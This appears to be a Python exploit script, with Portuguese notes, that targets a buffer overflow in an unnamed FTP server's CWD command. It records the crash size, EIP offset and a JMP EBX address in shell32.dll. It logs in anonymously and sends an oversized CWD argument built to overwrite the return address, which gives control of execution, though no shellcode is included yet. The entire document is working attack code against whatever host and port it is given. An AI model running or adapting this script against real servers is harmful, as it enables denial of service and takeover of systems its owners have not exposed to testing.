#!/usr/bin/python

"""
CRASH: 1300 bytes com o comando CWD
EIP: 6D42356D
PATTERN OFFSET : 6D42356D -> [*] Exact match at offset 1156
JMP EBX = 7CB1E88F -> shell32.dll
"""

import socket
import sys
import time

def check_arguments():
	if len(sys.argv) != 3:
		print("Missing arguments")
		print("Example: " + sys.argv[0] + " [host-ip] [port]")
		print("Usage: " + sys.argv[0] + " 192.168.0.2 21")
		exit()


def sleep_two_seconds():
	time.sleep(2)


def connect():
	buf = "A" * 1156 + "\x8f\xe8\xb1\x7c" * 4

	sck = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sck.connect((host, port))

	sleep_two_seconds()
	
	banner = sck.recv(4096)

	sck.send("USER anonymous\r\n")
	banner = sck.recv(4096)

	sck.send("PASS anonymous\r\n")
	banner = sck.recv(4096)

	sleep_two_seconds()

	sck.send("CWD " + buf + "\r\n")
	sleep_two_seconds()

def main():
	check_arguments()

	global host
	global port

	host = sys.argv[1]
	port = int(sys.argv[2])

	connect()


main()